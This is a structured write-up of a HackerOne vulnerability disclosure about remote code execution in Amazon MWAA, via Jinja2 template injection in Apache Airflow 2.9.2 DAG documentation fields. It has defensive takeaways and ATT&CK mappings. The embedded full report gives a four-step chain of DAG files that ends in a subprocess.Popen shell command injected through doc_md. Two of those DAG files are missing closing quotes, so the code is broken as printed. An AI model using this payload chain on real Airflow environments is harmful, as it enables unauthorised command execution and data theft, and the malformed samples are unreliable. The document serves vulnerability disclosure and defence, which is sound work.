# Remote Code Execution in Amazon MWAA via Server-Side Template Injection in Outdated Apache Airflow

## Metadata
- **Source:** HackerOne
- **Report:** 3217840 | https://hackerone.com/reports/3217840
- **Submitted:** 2025-06-24
- **Reporter:** ricardojoserf
- **Program:** Amazon Web Services (AWS) via HackerOne
- **Bounty:** Not specified in writeup
- **Severity:** critical
- **Vuln:** Server-Side Template Injection (SSTI), Remote Code Execution (RCE), Insufficient Input Validation, Use of Outdated Dependencies
- **CVEs:** CVE-2024-39877
- **Category:** memory-binary

## Summary
An Amazon MWAA instance running Apache Airflow 2.9.2 is vulnerable to Remote Code Execution through a Server-Side Template Injection (SSTI) vulnerability in DAG documentation fields. An attacker with the ability to upload DAG files to the MWAA S3 bucket can execute arbitrary code with the privileges of the Airflow service by injecting malicious Jinja2 template expressions that leverage Python's object introspection to access subprocess.Popen.

## Attack scenario
1. Attacker identifies or gains access to an MWAA S3 bucket used for storing DAG files
2. Attacker uploads a benign DAG file with a simple Jinja2 expression (e.g., {{3*3}}) to verify SSTI vulnerability exists
3. Attacker uploads a DAG that enumerates available Python classes via __subclasses__() to map the environment
4. Attacker locates the subprocess.Popen class index in the available subclasses list
5. Attacker uploads a malicious DAG file with Jinja2 template injection that instantiates subprocess.Popen to execute arbitrary shell commands
6. When MWAA parses and renders the DAG file, the injected template expressions execute arbitrary code within the Airflow worker context

## Root cause
Apache Airflow 2.9.2 fails to properly sanitize Jinja2 template expressions in DAG documentation fields (doc_md parameter). The templating engine evaluates Python expressions within double curly braces without sufficient sandboxing, allowing access to built-in Python object attributes and methods. Combined with Airflow's default configuration allowing unrestricted access to dangerous classes like subprocess.Popen, this creates an RCE vector.

## Attacker mindset
An insider or supply-chain attacker with S3 bucket access, or an external attacker who gains write permissions to the DAG storage bucket, seeks to execute arbitrary commands within the MWAA environment to exfiltrate data, establish persistence, or disrupt workflow orchestration. The incremental approach (test template injection → enumerate classes → locate Popen → execute code) demonstrates methodical exploitation with minimal noise.

## Defensive takeaways
- Immediately upgrade Apache Airflow to version 2.9.3 or later which patches CVE-2024-39877
- Implement strict input validation and disable Jinja2 template evaluation in DAG documentation fields, or use a sandboxed templating engine
- Restrict write access to DAG S3 buckets through IAM policies, requiring MFA and limiting to specific users/roles
- Disable or restrict access to dangerous Python classes (subprocess, os.system, etc.) at the Jinja2 environment level
- Implement Content Security Policy and restrict available Jinja2 filters and globals to only safe operations
- Enable CloudTrail logging and S3 access logging to detect unauthorized DAG uploads
- Proactively notify all MWAA customers running vulnerable Airflow versions to upgrade immediately
- Implement version pinning policies to prevent deployments of unsupported/vulnerable Airflow versions
- Deploy runtime intrusion detection to monitor for suspicious subprocess execution patterns within MWAA workers
- Conduct regular DAG file audits scanning for template injection patterns in doc_md and other templatable fields

## Variant hunting
Search for similar SSTI vulnerabilities in other Airflow configuration parameters that support Jinja2 templating (task descriptions, variable references, connection URIs). Investigate whether other AWS managed services (EMR, SageMaker) have similar template injection risks. Test Airflow versions 2.8.x and 2.7.x for similar SSTI patterns. Examine custom Airflow plugins for improper template handling. Check if other workflow orchestration platforms (Prefect, Dagster) have analogous vulnerabilities.

## MITRE ATT&CK
- T1190: Exploit Public-Facing Application
- T1059: Command and Scripting Interpreter
- T1203: Exploitation for Client Execution
- T1072: Software Deployment Tools
- T1583: Acquire Infrastructure (S3 bucket access)
- T1195: Supply Chain Compromise
- T1059.007: Python

## Notes
The reporter appropriately followed AWS responsible disclosure procedures by initially contacting AWS security before public submission. The incremental PoC approach demonstrates sophisticated exploitation technique awareness. Redacted CVE number in original report (shown as CVE-██████████-39877, likely CVE-2024-39877) suggests AWS may have coordinated disclosure timeline. The recommendation to disable subprocess.Popen is defense-in-depth but not sufficient alone—the core fix requires patching Jinja2 evaluation in DAG processing. This vulnerability has significant blast radius given MWAA's enterprise adoption for ETL/orchestration workloads. Organizations should treat this as critical priority given trivial exploitation once S3 access is obtained.

## Full report
<details><summary>Expand</summary>

**Explanation:**

I am a penetration tester working with Siemens. During a collaborative security assessment with an internal team, I discovered a Remote Code Execution (RCE) vulnerability in an Amazon Managed Workflows for Apache Airflow (MWAA) environment. I initially reported this issue to the AWS security team via aws-security@amazon.com, and they directed me to submit the vulnerability through this HackerOne program. I also would like to know how far it is legally correct to execute code, I understand this is Amazon's infrastructure so I just did a quick PoC to prove the affected team how important it is to solve this issue.

**Description:** 

The team using Amazon MWAA is currently running Apache Airflow version 2.9.2, which is affected by CVE-██████████-39877, a Server-Side Template Injection (SSTI) vulnerability that enables Remote Code Execution (RCE). 

**Recommendations:**

Given the severity of this issue, I strongly recommend that :
- Amazon discontinues offering any Airflow versions below 2.9.3 on the MWAA service.
- Disable classes which might be used to execute code remotely on the context of the MWAA environment, such as *subprocess.Popen*.
- Additionally, if any customers are still running vulnerable versions, they should be proactively notified, similar to how they receive alerts when suspicious activity is detected, such as repeated requests to /robots.txt that may indicate web scanner activity.

## Steps To Reproduce:

   1. First, upload to the S3 bucket a DAG file named "test_1.py" to check the vulnerability exists. If it does, there should be a "9" when clicking "Grid" in the newly created "test_1" DAG - if not, the version might not be vulnerable:

```
from datetime import datetime, timedelta
from airflow import DAG
from airflow.operators.python import PythonOperator

def say_hello():
    print("¡Hola, mundo desde Airflow!")

default_args = {
    'owner': 'airflow',
    'retries': 1,
    'retry_delay': timedelta(minutes=1),
}

with DAG(
    dag_id='test_1',
    default_args=default_args,
    description='Test Uno',
    schedule_interval='@daily',  # se ejecuta una vez al día
    start_date=datetime(███████),
    catchup=False,
    tags=['ejemplo'],
    doc_md="""
    # Test 1
    {{3*3}}
    """
) as dag:
    tarea_1 = PythonOperator(
        task_id='di_hola',
        python_callable=say_hello,
    )
```

   2. Second, upload to the S3 bucket a DAG file "test_2.py" to list the available classes, with code like this:

```
from datetime import datetime, timedelta
from airflow import DAG
from airflow.operators.python import PythonOperator

def say_hello():
    print("¡Hola, mundo desde Airflow!")

default_args = {
    'owner': 'airflow',
    'retries': 1,
    'retry_delay': timedelta(minutes=1),
}

with DAG(
    dag_id='test_2',
    default_args=default_args,
    description='Un DAG de ejemplo muy simple',
    schedule_interval='@daily',  # se ejecuta una vez al día
    start_date=datetime(██████),
    catchup=False,
    tags=['ejemplo'],
    doc_md="""
    # Test 2
    {{ ''.__class__.__mro__[1].__subclasses__() }}
    """
) as dag:
    tarea_1 = PythonOperator(
        task_id='di_hola',
        python_callable=say_hello,
    )
```

  3. Copy the list of available classes and find the index for the *subProcess.Popen* class. A easy way to do this is is to copy all the classes until Popen class, and count the number of commas before it. In my case the index number is 309, but it will be different when you test this.

  4.  Once you have the correct index, check the class name is correct, you should see "Popen" if you got the correct index. Upload "test_3.py". **NOTE**: Update the correct index, it will not be 309:

```
from datetime import datetime, timedelta
from airflow import DAG
from airflow.operators.python import PythonOperator

def say_hello():
    print("¡Hola, mundo desde Airflow!")

default_args = {
    'owner': 'airflow',
    'retries': 1,
    'retry_delay': timedelta(minutes=1),
}

with DAG(
    dag_id='test_3',
    default_args=default_args,
    description='Un DAG de ejemplo muy simple',
    schedule_interval='@daily',  # se ejecuta una vez al día
    start_date=datetime(██████),
    catchup=False,
    tags=['ejemplo'],
    doc_md="""
    # Test 3
    ### Class Name
    {{ ''.__class__.__mro__[1].__subclasses__()[309].__name__ }}
) as dag:
    tarea_1 = PythonOperator(
        task_id='di_hola',
        python_callable=say_hello,
    )
```

  5. Now with the correct index, run a command on the context of the MWAA environment with "test_4.py". **NOTE**: Update the correct index, it will not be 309:

 ```
from datetime import datetime, timedelta
from airflow import DAG
from airflow.operators.python import PythonOperator
def say_hello():
    print("¡Hola, mundo desde Airflow!")
default_args = {
    'owner': 'airflow',
    'retries': 1,
    'retry_delay': timedelta(minutes=1),
}
with DAG(
    dag_id='test_4',
    default_args=default_args,
    description='Un DAG de ejemplo muy simple',
    schedule_interval='@daily',  # se ejecuta una vez al día
    start_date=datetime(█████),
    catchup=False,
    tags=['ejemplo'],
    doc_md="""
    # Test 4
    ### Commands Output
    {{ ''.__class__.__mro__[1].__subclasses__()[309]('id', shell=True, stdout=-1).communicate() }}
) as dag:
    tarea_1 = PythonOperator(
        task_id='di_hola',
        python_callable=say_hello,
    )
```

## Impact

## Summary: An attacker can execute arbitrary commands remotely on the affected environment. While I limited my actions to a non-destructive proof-of-concept command, a malicious actor could leverage this vulnerability to access sensitive data, manipulate the system, or pivot to attack other resources within the same VPC. The risk includes potential full system compromise and lateral movement within the cloud infrastructure.

</details>

---
*Analysed by Claude on 2026-05-12*
